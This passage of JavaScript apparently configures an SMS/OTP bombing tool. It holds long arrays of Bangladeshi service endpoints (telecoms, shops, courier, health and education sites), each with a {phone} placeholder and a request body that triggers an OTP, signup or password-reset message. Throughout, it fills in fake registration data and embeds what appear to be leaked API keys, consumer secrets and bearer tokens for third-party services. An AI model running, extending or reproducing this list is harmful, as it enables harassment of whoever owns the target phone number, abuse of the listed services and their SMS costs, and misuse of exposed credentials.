  { id: 1290, name: "RFL BestBuy", method: "POST", url: "https://rflbestbuy.com/api/login/?lang_code=en&currency_code=BDT", body: '{"company_id":"26","password2":"Riyaz@123","currency_code":"BDT","user_type":"C","email":"{phone}@gmail.com","g_id":"","lang_code":"en","operating_system":"Android","otp_verify":false,"password1":"Riyaz@123","phone":"{phone}","storefront_id":"3"}', headers: { "Content-Type": "application/json" } },
  { id: 1291, name: "HishabExpress", method: "POST", url: "https://api.hishabexpress.com/login/status", isFormData: true, body: { msisdn: "{phone}", hash: "Hello" }, headers: { "Content-Type": "application/x-www-form-urlencoded" } },
  { id: 1292, name: "Chorcha", method: "GET", url: "https://mujib.chorcha.net/auth/check?phone={phone}", headers: { "x-chorcha-mode": "prod", "x-chorcha-platform": "web" } },
  { id: 1293, name: "Wafilife", method: "GET", url: "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3" },
  { id: 1294, name: "Robi Register", method: "POST", url: "https://webapi.robi.com.bd/v1/account/register/otp", body: '{"phone_number":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1295, name: "eTestPaper Exists", method: "POST", url: "https://prod.etestpaper.net/api/exists", body: '{"phone":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1296, name: "eTestPaper OTP", method: "POST", url: "https://prod.etestpaper.net/api/v4/auth/otp", body: '{"phone":"{phone}","recaptcha":"668be73dcad2999a957ff440"}', headers: { "Content-Type": "application/json" } },
  { id: 1297, name: "GPay CheckSignup", method: "POST", url: "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup", body: '{"deviceId":"35{phone}30","msisdn":"{phone}","tran_type":"OTPREQSIGNUP"}', headers: { "Content-Type": "application/json" } },
  { id: 1298, name: "Kabbik", method: "POST", url: "https://api.kabbik.com/v1/auth/otpnew", body: '{"msisdn":"88{phone}","currentTimeLong":"{ts}","passKey":"qOQNBtVmoTTPVmfn"}', dynamicFields: true, headers: { "Content-Type": "application/json" } },
  { id: 1299, name: "Salextra", method: "POST", url: "https://salextra.com.bd/customer/checkusernameavailabilityonregistration", isFormData: true, body: { username: "{phone}", loginType: "MOBILE" }, headers: { "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest" } },
  { id: 1300, name: "Sundora", method: "POST", url: "https://api.sundora.com.bd/api/user/customer/", body: '{"customer":{"email":"kgjkgjgg{phone}@gmail.com","password":"#bUV?3*N7N.g","password_confirmation":"#bUV?3*N7N.g","phone":"+880{phone}","first_name":"sdfgfd","last_name":"fgfd","newsletter_email":true,"newsletter_sms":true}}', headers: { "Content-Type": "application/json" } },
  { id: 1301, name: "Cinematic SBENT", method: "POST", url: "https://api.mygp.cinematic.mobi/api/v1/otp/88{phone}/SBENT_3GB7D", body: '{"accessinfo":{"access_token":"K165S6V6q4C6G7H0y9C4f5W7t5YeC6","referenceCode":"20190827042622"}}', headers: { "Content-Type": "application/json" } },
  { id: 1302, name: "Bajistar", method: "GET", url: "https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{phone}" },
  { id: 1303, name: "Meenabazar", method: "POST", url: "https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone}&type=login", headers: { "Content-Type": "application/json" } },
  { id: 1304, name: "IQRA v1", method: "GET", url: "http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}" },
  { id: 1305, name: "Chokrojan Login", method: "POST", url: "https://chokrojan.com/api/v1/passenger/login/mobile", body: '{"mobile_number":"{phone}","otp_token":"826cb796fd3f163c420c8da1238aa9d1c4da36d4f5729d711a9cacaca47df5a7"}', headers: { "Content-Type": "application/json", "Authorization": "Bearer null" } },
  { id: 1306, name: "MyBDJobs", method: "POST", url: "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount", body: '{"firstName":"{name}","lastName":"","gender":"M","email":"{email}","userName":"{phone}","password":"Kamrul12345@","confirmPassword":"Kamrul12345@","status":0,"mobile":"{phone}","workAreaCategory":2,"createdFrom":0,"createdAt":"{ts}","decodeId":"","catTypeId":1,"userNameType":"mobile","disabilityId":"","deviceTypeId":0,"countryCode":"88","socialMediaId":"","socialMediaName":"","socialMediaTimestamp":"{ts}","ttcId":"","gradeId":"","knownBy":"","isTtc":false,"trainingCenterName":"","trainingDistrict":"","queryString":"","campaignId":0,"campaignSource":"","campaignReferer":"","isFromSocialMedia":false,"isActive":0,"useType":"","uNtype":0}', dynamicFields: true, headers: { "Content-Type": "application/json" } },
  { id: 1307, name: "Ultimate Organic", method: "POST", url: "https://ultimateasiteapi.com/api/register-customer", body: '{"customer_name":"hu","customer_password":"12345678","customer_password_confirmation":"12345678","customer_email":"{phone}hu@gmail.com","customer_contact":"{phone}","customer_dob":"2000-01-02","customer_gender":"male"}', headers: { "Content-Type": "application/json" } },
  { id: 1308, name: "Ultimate Organic Forget", method: "POST", url: "https://ultimateasiteapi.com/api/forget-customer-password", body: '{"user_input":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1309, name: "Foodaholic Forgot", method: "POST", url: "https://foodaholic.com.bd/api/v1/auth/forgot-password", body: '{"phone":"+88{phone}"}', headers: { "Content-Type": "application/json", "authorization": "Bearer null" } },
  { id: 1310, name: "Foodaholic Signup", method: "POST", url: "https://foodaholic.com.bd/api/v1/auth/sign-up", body: '{"f_name":"{name}","l_name":"","phone":"+88{phone}","email":"{email}","password":"Riyaz@123","ref_code":""}', headers: { "Content-Type": "application/json", "authorization": "Bearer null" } },
  { id: 1311, name: "KFCBD Register", method: "POST", url: "https://api.kfcbd.com/register", body: '{"id":null,"name":"Sojib khane","email":"{email}","mobile":"{phone}","address":null,"device_token":"dLvYmVLqT02A_ZAFsFa8gJ:APA91bHC8CtSoO-TaN-NFm4obg10-Blc1vji2lbq82KbIyEGsXobCa8hZs-XbWjyTYnLE7KgYDRWKdteBgU6zvixuYG-vV4aGCEvkItCk6DiXYKVvd_ecWxqraqX6vyYJMfWDWDeF1EG","token":null,"dob":"","otp":null}', headers: { "Content-Type": "application/json" } },
  { id: 1312, name: "Eonbazar Register", method: "POST", url: "https://app.eonbazar.com/api/auth/register", body: '{"mobile":"{phone}","name":"{name}","password":"Soji12345","email":"{email}"}', headers: { "Content-Type": "application/json", "carttoken": "5d7bcfdb-27ae-453f-a4b9-6cf94da73032", "ordersource": "web" } },
  { id: 1313, name: "Eonbazar Login", method: "POST", url: "https://app.eonbazar.com/api/auth/login", body: '{"method":"otp","mobile":"{phone}"}', headers: { "Content-Type": "application/json", "carttoken": "6c2f5732-65f7-461d-be7e-5dc887af6d37" } },
  { id: 1314, name: "Eat-Z App", method: "POST", url: "https://api.eat-z.com/auth/customer/app-connect", body: '{"username":"+880{phone}"}', headers: { "Content-Type": "application/json", "x-eatz-apiclient": "ANDROID" } },
  { id: 1315, name: "Kormi24 GraphQL", method: "POST", url: "https://api.kormi24.com/graphql", body: '{"operationName":"sendOTP","variables":{"type":1,"mobile":"{phone}","additional":"{\\"user_agent\\":\\"web\\",\\"mobile\\":\\"{phone}\\"}","hash":"c3275518789fb74ac6cc30ce030afbf0bdff578579e2fb64571e63f5b2680180"},"query":"mutation sendOTP($mobile: String!, $type: Int!, $additional: String, $hash: String!) { sendOTP(mobile: $mobile, type: $type, additional: $additional, hash: $hash) { status message __typename } }"}', headers: { "Content-Type": "application/json", "authorization": "tok" } },
  { id: 1316, name: "Shwapno Auth", method: "POST", url: "https://www.shwapno.com/api/auth", body: '{"phoneNumber":"+88{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1317, name: "MyBL Send OTP", method: "POST", url: "https://myblapi.banglalink.net/api/v1/send-otp", body: '{"phone":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1318, name: "Walton Plaza GraphQL", method: "POST", url: "https://api.waltonplaza.com.bd/graphql", body: '{"operationName":"createCustomerOtp","variables":{"auth":{"countryCode":"880","deviceUuid":"998283c0-622a-11ee-84c0-190466a47baa","phone":"{phone}"},"device":null},"query":"mutation createCustomerOtp($auth: CustomerAuthInput!, $device: DeviceInput) { createCustomerOtp(auth: $auth, device: $device) { message result { id __typename } statusCode __typename } }"}', headers: { "Content-Type": "application/json" } },
  { id: 1319, name: "PBS Generate OTP", method: "POST", url: "https://apialpha.pbs.com.bd/api/OTP/generateOTP", body: '{"userPhone":"{phone}","otp":""}', headers: { "Content-Type": "application/json" } },
  { id: 1320, name: "Aarong Check + Send", method: "POST", url: "https://mcprod.aarong.com/graphql", body: '{"query":"query{checkCustomerExist(mobile_number:\\"{phone}\\" email:\\"\\"){status message}}"}', headers: { "Content-Type": "application/json", "store": "default" } },
  { id: 1321, name: "Aarong Token + OTP", method: "POST", url: "https://mcprod.aarong.com/graphql", body: '{"query":"mutation generateCustomerToken($email: String!, $password: String!, $type: String!, $mobile_number: String!) { generateCustomerToken(email: $email password: $password type: $type mobile_number: $mobile_number ) { token message } }","variables":{"email":"","password":"","type":"mobile_number","mobile_number":"{phone}"}}', headers: { "Content-Type": "application/json", "store": "default" } },
  { id: 1322, name: "Aarong Resend", method: "POST", url: "https://mcprod.aarong.com/graphql", body: '{"query":"mutation resendOtp($email: String, $mobile_number: String!, $type: String!) { resendOtp(input: { email: $email mobile_number: $mobile_number type: $type }) }","variables":{"email":"","mobile_number":"{phone}","type":"mobile_number"}}', headers: { "Content-Type": "application/json", "store": "default" } },
  { id: 1323, name: "Arogga Mobile", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send?f=app&v=6.2.7&os=android&osv=33", isFormData: true, body: { mobile: "{phone}", fcmToken: "cQYjPWHHTDu1IVXnW90Xqs:APA91bHB71xe_ai41Vm-aq9DFkukrF9mAH13DPAIInmus7pykdI49PZTgqy4Qy5x8Q5TG6zd1HIOIGDCV8UH5K5l3rc1Z36R-km9T-NhotH3TBjhJOZ43Kw2xqr8lr3vuWgTMUHybMnR", referral: "" }, headers: { "Content-Type": "application/x-www-form-urlencoded" } },
  { id: 1324, name: "Sundarban Courier GraphQL 2", method: "POST", url: "https://api-gateway.sundarbancourierltd.com/graphql", body: '{"operationName":"CreateAccessToken","variables":{"accessTokenFilter":{"userName":"{phone}"}},"query":"mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"}', headers: { "Content-Type": "application/json" } },
  { id: 1325, name: "Quiztime", method: "POST", url: "https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp", body: '{"country_code":"+88","phone":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1326, name: "Dressup", method: "POST", url: "https://dressup.com.bd/wp-json/api/flutter_user/digits/send_otp", body: '{"country_code":"+880","mobile":"{phone}","type":"login","whatsapp":false}', headers: { "Content-Type": "application/json" } },
  { id: 1327, name: "Fabrilife Register", method: "POST", url: "https://fabrilife.com/api/wp-json/wc/v2/user/register", body: '{"name":"{name}","email":"{phone}@gmail.com","phone":"{phone}","password":"Riyaz@123"}', headers: { "Content-Type": "application/json" } },
  { id: 1328, name: "Fabrilife Phone Login", method: "POST", url: "https://fabrilife.com/api/wp-json/wc/v2/user/phone-login/{phone}", headers: { "otpkey": "uzmgAMHfQrukDqV1ecZ2xJGwqjiVPnE0byuqw2MW" } },
  { id: 1329, name: "Kotha DeviceAuth", method: "POST", url: "https://user.kotha.im/mobile/api/deviceAuthWithRecipientStatus", body: '{"deviceId":"{device}","recipient":"+88{phone}"}', dynamicFields: true, headers: { "Content-Type": "application/json" } },
  { id: 1330, name: "Kotha SendOTPV2", method: "POST", url: "https://user.kotha.im/mobile/api/sendOTPV2", body: '{"deviceId":"{device}","recipient":"+88{phone}","retryAttempt":0}', dynamicFields: true, headers: { "Content-Type": "application/json" } },
  { id: 1331, name: "BTCL BDIA v2", method: "POST", url: "https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp?moduleID=1", isFormData: true, body: { actionType: "otpSend", mobileNo: "{phone}" }, headers: { "Content-Type": "application/x-www-form-urlencoded" } },
  { id: 1332, name: "BTCL Phonebill Type15", method: "POST", url: "https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json", body: '{"OTPType":15,"userName":"{phone}","isNewPhoneOrEmail":false}', headers: { "Content-Type": "application/json" } }
];

// ============================================================
// PHP CONVERTED (api1-48)
// ============================================================
const PHP_CONVERTED_APIS = [
  { id: 500, name: "PHP-1 RedX Signup", method: "POST", url: "https://api.redx.com.bd/v1/user/signup", body: { name: "{phone}", service: "redx", phoneNumber: "{phone}" }, headers: { "Content-Type": "application/json" }, insecure: true },
  { id: 501, name: "PHP-2 KhaasFood Step1", method: "POST", url: "https://www.khaasfood.com/wp-admin/admin-ajax.php", isFormData: true, body: { mobileNo: "+880{phone_e164}", countrycode: "+880", csrf: "9d9d08e6e5", login: "1", json: "1", action: "digits_check_mob" }, headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest" } },
  { id: 502, name: "PHP-2 KhaasFood Step2", method: "POST", url: "https://www.khaasfood.com/wp-admin/admin-ajax.php", isFormData: true, body: { mobileNo: "+880{phone_e164}", digits_reg_mail: "+880{phone_e164}", dig_nounce: "9d9d08e6e5", action: "digits_check_mob", login: "2", countrycode: "+880", digregcode: "+880", digregcode2: "+880", digits: "1", dtype: "2", json: "1", csrf: "9d9d08e6e5" }, headers: { "X-Requested-With": "XMLHttpRequest" } },
  { id: 503, name: "PHP-3 Bioscope Live", method: "POST", url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", body: { number: "+88{phone}" }, headers: { "content-type": "application/json" } },
  { id: 504, name: "PHP-4 Bikroy Login", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}", headers: { "application-name": "web" } },
  { id: 505, name: "PHP-5 Proiojon", method: "POST", url: "https://billing.proiojon.com/api/v1/auth/sign-up", dynamicFields: true, body: { name: "randomName", email: "randomEmail", phone: "{phone}", password: "password123", ref_code: "" }, headers: { "content-type": "application/json" } },
  { id: 506, name: "PHP-6 BeautyBooth", method: "POST", url: "https://admin.beautybooth.com.bd/api/v2/auth/signup", body: { phone: "{phone}" }, headers: { "User-Agent": "Dart/2.19 (dart:io)", "Content-Type": "application/json" } },
  { id: 507, name: "PHP-7 Medha", method: "POST", url: "https://developer.medha.info/api/send-otp", body: { phone: "880{phone_10}", is_register: "1" }, headers: { "User-Agent": "Dart/3.2 (dart:io)", "Content-Type": "application/json" } },
  { id: 508, name: "PHP-8 DeeptoPlay", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: { number: "+88{phone}" }, headers: { "content-type": "application/json" }, insecure: true },
  { id: 509, name: "PHP-9 Robi Web OTP", method: "POST", url: "https://webapi.robi.com.bd/v1/send-otp", body: { phone_number: "{phone}", type: "doorstep" }, insecure: true },
  { id: 510, name: "PHP-10 Arogga", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10", isFormData: true, body: { mobile: "{phone}", fcmToken: "", referral: "" } },
  { id: 511, name: "PHP-11 Cinematic GP", method: "POST", url: "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{phone}", headers: { "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri" } },
  { id: 512, name: "PHP-12 BDStall", method: "POST", url: "https://www.bdstall.com/userRegistration/save_otp_info/", isFormData: true, body: { UserTypeID: "2", RequestType: "1", Name: "Md", Mobile: "{phone}" } },
  { id: 513, name: "PHP-13 BCS Examaid", method: "POST", url: "https://bcsexamaid.com/api/generateotp", body: { mobile: "{phone}", softtoken: "Rifat.Admin.2022" }, headers: { "User-Agent": "Dart/3.1 (dart:io)", "Content-Type": "application/json" } },
  { id: 514, name: "PHP-14 DoctorLiveBD", method: "POST", url: "https://doctorlivebd.com/api/patient/auth/otpsend", isFormData: true, body: { country_code: "880", mobile: "{phone_10}" }, headers: { "User-Agent": "okhttp/4.10.0" } },
  { id: 515, name: "PHP-15 Sheba Token", method: "GET", url: "https://accounts.sheba.xyz/api/v1/accountkit/generate/token?app_id=8329815A6D1AE6DD", dynamicToken: true },
  { id: 516, name: "PHP-15 Sheba OTP", method: "POST", url: "https://accountkit.sheba.xyz/api/shoot-otp", body: { mobile: "+88{phone}", app_id: "8329815A6D1AE6DD", api_token: "{token}" }, requiresToken: true, headers: { "Content-Type": "application/json" } },
  { id: 517, name: "PHP-16 Apex4u", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: { phoneNumber: "{phone}" }, headers: { "content-type": "application/json" } },
  { id: 518, name: "PHP-17 Sindabad", method: "POST", url: "https://offers.sindabad.com/api/mobile-otp", body: { key: "c94e67fb2a59af3b6fa21f24463b2061", mobile: "+88{phone}" }, headers: { "Content-Type": "application/json" } },
  { id: 519, name: "PHP-18 KireiBD", method: "POST", url: "https://app.kireibd.com/api/v2/send-login-otp", body: { email: "{phone}" }, headers: { "Content-Type": "application/json" }, insecure: true },
  { id: 520, name: "PHP-19 Shikho v2", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: { phone: "{phone}", type: "student", auth_type: "signup", vendor: "shikho" }, headers: { "Content-Type": "application/json" } },
  { id: 521, name: "PHP-20 Circle Reseller", method: "POST", url: "https://reseller.circle.com.bd/api/v2/auth/signup", body: { name: "+88{phone}", email_or_phone: "+88{phone}", password: "123456", password_confirmation: "123456", register_by: "phone" }, insecure: true },
  { id: 522, name: "PHP-21 BDTickets", method: "POST", url: "https://api.bdtickets.com:20100/v1/auth", body: { createUserCheck: true, phoneNumber: "+88{phone}", applicationChannel: "WEB_APP" }, headers: { "content-type": "application/json" } },
  { id: 523, name: "PHP-22 GP FWA OTP", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: { phone: "{phone}", email: "", language: "en" } },
  { id: 524, name: "PHP-23 RFL", method: "POST", url: "https://rflbestbuy.com/api/login/?lang_code=en&currency_code=BDT", body: { company_id: "26", phone: "{phone}" } },
  { id: 525, name: "PHP-24 Chorki Mobile", method: "POST", url: "https://api-dynamic.chorki.com/v1/auth/login?country=BD&platform=mobile", body: { number: "{phone}" }, headers: { "User-Agent": "Chorki/2.0.33" } },
  { id: 526, name: "PHP-25 HishabExpress", method: "POST", url: "https://api.hishabexpress.com/login/status", isFormData: true, body: { msisdn: "{phone}", hash: "Hello" }, insecure: true },
  { id: 527, name: "PHP-26 Chorcha", method: "GET", url: "https://mujib.chorcha.net/auth/check?phone={phone}", headers: { "x-chorcha-mode": "prod", "x-chorcha-platform": "web" } },
  { id: 528, name: "PHP-27 Wafilife", method: "GET", url: "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3" },
  { id: 529, name: "PHP-28 Robi Register", method: "POST", url: "https://webapi.robi.com.bd/v1/account/register/otp", body: { phone_number: "{phone}" }, insecure: true },
  { id: 530, name: "PHP-29 Chardike", method: "POST", url: "https://api.chardike.com/api/otp/send", body: { phone: "{phone}", otp_type: "login" }, headers: { "content-type": "application/json" } },
  { id: 531, name: "PHP-30 eTestPaper Exists", method: "POST", url: "https://prod.etestpaper.net/api/exists", body: { phone: "{phone}" } },
  { id: 532, name: "PHP-30 eTestPaper OTP", method: "POST", url: "https://prod.etestpaper.net/api/v4/auth/otp", body: { phone: "{phone}", recaptcha: "668be73dcad2999a957ff440" } },
  { id: 533, name: "PHP-31 GPay", method: "POST", url: "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup", body: { deviceId: "35{phone}30", msisdn: "{phone}", tran_type: "OTPREQSIGNUP" } },
  { id: 534, name: "PHP-32 AppLink", method: "POST", url: "https://apps.applink.com.bd/appstore-v4-server/login/otp/request", body: { msisdn: "88{phone}" }, insecure: true },
  { id: 535, name: "PHP-33 Priyo", method: "POST", url: "https://app.priyoshikkhaloy.com/api/user/register-login.php", isFormData: true, body: { mobile: "{phone}" }, insecure: true },
  { id: 536, name: "PHP-34 Kabbik", method: "POST", url: "https://api.kabbik.com/v1/auth/otpnew", dynamicFields: true, body: { msisdn: "88{phone}", currentTimeLong: "currentTime", passKey: "qOQNBtVmoTTPVmfn" }, insecure: true },
  { id: 537, name: "PHP-35 Salextra", method: "POST", url: "https://salextra.com.bd/customer/checkusernameavailabilityonregistration", isFormData: true, body: { username: "{phone}", loginType: "MOBILE" } },
  { id: 538, name: "PHP-36 Sundora", method: "POST", url: "https://api.sundora.com.bd/api/user/customer/", body: { customer: { email: "kgjkgjgg{phone}@gmail.com", password: "#bUV?'3*N#7N}.g", password_confirmation: "#bUV?'3*N#7N}.g", phone: "+880{phone_10}", first_name: "sdfgfd", last_name: "fgfd", note: { birthday: "", gender: "male" }, withTimeout: true, newsletter_email: true, newsletter_sms: true } } },
  { id: 539, name: "PHP-37 Cinematic SBENT", method: "POST", url: "https://api.mygp.cinematic.mobi/api/v1/otp/88{phone}/SBENT_3GB7D", insecure: true },
  { id: 540, name: "PHP-38 BajiStar", method: "GET", url: "https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{phone}" },
  { id: 541, name: "PHP-39 DocTime", method: "POST", url: "https://api.doctime.com.bd/api/authenticate", body: { contact_no: "{phone}", country_calling_code: "88" }, insecure: true },
  { id: 542, name: "PHP-40 WebLoginDA", method: "POST", url: "https://webloginda.grameenphone.com/backend/api/v1/otp", isFormData: true, body: { msisdn: "{phone}" } },
  { id: 543, name: "PHP-41 Meenabazar", method: "POST", url: "https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone}&type=login", headers: { "User-Agent": "Dart/3.2 (dart:io)" } },
  { id: 544, name: "PHP-42 MedEasy", method: "GET", url: "https://api.medeasy.health/api/send-otp/+88{phone}/" },
  { id: 545, name: "PHP-43 Iqra Live", method: "GET", url: "http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}", insecure: true },
  { id: 546, name: "PHP-44 Chokrojan", method: "POST", url: "https://chokrojan.com/api/v1/passenger/login/mobile", body: { mobile_number: "{phone}", otp_token: "826cb796fd3f163c420c8da1238aa9d1c4da36d4f5729d711a9cacaca47df5a7" }, insecure: true },
  { id: 547, name: "PHP-45 Shomvob", method: "POST", url: "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", body: { phone: "88{phone}" }, headers: { "Content-Type": "application/json" } },
  { id: 548, name: "PHP-46 RedX v2", method: "POST", url: "https://api.redx.com.bd/v1/user/signup", body: { name: "Alamin Sheikh", phoneNumber: "{phone}", service: "redx" }, insecure: true },
  { id: 549, name: "PHP-47 Cinematic Common", method: "POST", url: "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/", insecure: true },
  { id: 550, name: "PHP-48 MyBDJobs", method: "POST", url: "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount", dynamicFields: true, body: { firstName: "randomName", userName: "{phone}", mobile: "{phone}", countryCode: "88" } }
];

// ============================================================
// NEW APIS V7.1
// ============================================================
const NEW_APIS_V71 = [
  { id: 351, name: "Walton Plaza", method: "POST", url: "https://waltonplaza.com.bd/api/auth/otp/create", body: { auth: { countryCode: "880", deviceUuid: "197bef80-ec8a-11f0-8299-fdfde03856d4", phone: "{phone}", type: "LOGIN" }, captchaToken: "no recapcha" } },
  { id: 352, name: "QuickMart BD", method: "POST", url: "https://quickmart.com.bd/customer/auth/phone-register", isFormData: true, body: { _token: "UXLmYbXMRijnLuihYcoLBXYG5bu25X4K8E6gVeqs", phone: "{phone}" } },
  { id: 353, name: "Glanis Skincare", method: "POST", url: "https://www.glanisskincare.com.bd/customer-login", isFormData: true, body: { _token: "tX7eVhj93u8lLSTWVBDwIBN4jvruZNqc7VVAmf1v", phone: "{phone}" } },
  { id: 354, name: "SmartDeal BD", method: "POST", url: "https://smartdeal.com.bd/register", isFormData: true, body: { _token: "gkjdzpI26XOPh062eg0gDxZSxX34XpOkiuHmjisZ", name: "nox", phone: "{phone}", country_code: "88", email: "", password: "unlock2022", password_confirmation: "unlock2022", checkbox_example_1: "on" } },
  { id: 355, name: "GX Sends", method: "GET", url: "https://gxsends.onrender.com/run-all?phone={phone}", timeout: 30000 }
];

// ============================================================
// ORIGINAL BD APIS
// ============================================================
const ORIGINAL_APIS = [
  { id: 1, name: "Bikroy.com", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}" },
  { id: 2, name: "GP MyGP", method: "GET", url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0" },
  { id: 3, name: "Shukhee", method: "GET", url: "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn" },
  { id: 4, name: "MedEasy Basic", method: "GET", url: "https://api.medeasy.health/api/send-otp/+88{phone}/" },
  { id: 5, name: "Ultranet", method: "GET", url: "http://ultranetrn.com.br/fonts/api.php?number={phone}" },
  { id: 6, name: "eCourier", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}" },
  { id: 7, name: "Binge GET", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
  { id: 8, name: "Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
  { id: 9, name: "Deshal", method: "POST", url: "https://app.deshal.net/api/auth/login", body: { phone: "{phone}" } },
  { id: 10, name: "GP Web", method: "POST", url: "https://weblogin.grameenphone.com/backend/api/v1/otp", body: { msisdn: "{phone}" } },
  { id: 11, name: "GP FWA/Bkash", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: { phone: "{phone}", email: "", language: "en" } },
  { id: 12, name: "BusBD", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: { phone: "+88{phone}" } },
  { id: 13, name: "Paperfly", method: "POST", url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", body: { full_name: "Apk", email_address: "apk@test.com", company_name: "Ahgbd", phone_number: "{phone}" } },
  { id: 14, name: "OsudPotro", method: "POST", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: { mobile: "+880{phone}", deviceToken: "web", language: "en", os: "web" } },
  { id: 15, name: "Apex4u", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: { phoneNumber: "{phone}" } },
  { id: 16, name: "Bohubrihi", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: { phone: "{phone}", intent: "login" } },
  { id: 17, name: "Fundesh", method: "POST", url: "https://fundesh.com.bd/api/auth/generateOTP", body: { msisdn: "{phone}" } },
  { id: 18, name: "Jatri", method: "POST", url: "https://user-api.jslglobal.co/v2/send-otp", body: { phone: "+88{phone}", jatri_token: "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj" } },
  { id: 19, name: "RedX Merchant", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: { mobile: "+88{phone}" } },
  { id: 20, name: "RabbitHole", method: "POST", url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", body: { mobile: "+88{phone}" } },
  { id: 21, name: "Qcoom", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: { mobileNumber: "+88{phone}" } },
  { id: 22, name: "Garibook", method: "POST", url: "https://api.garibookadmin.com/api/v4/user/login", body: { mobile: "+880{phone}", recaptcha_token: "garibookcaptcha", channel: "web" } },
  { id: 23, name: "Training.gov", method: "POST", url: "https://training.gov.bd/backoffice/api/user/sendOtp", body: { mobile: "{phone}" } },
  { id: 24, name: "Shikho #1", method: "POST", url: "https://api.shikho.com/public/activity/otp", body: { phone: "{phone}", intent: "ap-discount-request" } },
  { id: 25, name: "Easy.com.bd", method: "POST", url: "https://core.easy.com.bd/api/v1/registration", body: { name: "Tusar", email: "apk@test.com", mobile: "{phone}", password: "amitusar", password_confirmation: "amitusar" } },
  { id: 26, name: "Robi DA", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: { msisdn: "{phone}" } },
  { id: 27, name: "Hoichoi", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: { phoneNumber: "{phone}", requestType: "send", emailConsent: true, whatsappConsent: true } },
  { id: 28, name: "Addatimes", method: "POST", url: "https://app.addatimes.com/api/login", body: { phone: "{phone}", country_code: "BD" } },
  { id: 29, name: "Regal OTP", method: "POST", url: "https://regalfurniturebd.com/api/auth/otp-generate", body: { phone: "{phone}", verification_code: "" } },
  { id: 30, name: "Regal Register", method: "POST", url: "https://regalfurniturebd.com/api/auth/register", body: { name: "User", email: "u@e.com", phone: "{phone}", password: "pass123" } },
  { id: 31, name: "DeeptoPlay Web", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: { email: "apk@test.com", phone_number: "88{phone}" } },
  { id: 32, name: "Timezone OTP", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/otp-request", body: { phone: "{phone}" } },
  { id: 33, name: "Timezone Register", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/regnewcustomer", body: { name: "Tusar", email: "t@t.com", phone: "{phone}", password: "aAeMY@5hG8iUfD4", password_confirmation: "aAeMY@5hG8iUfD4" } },
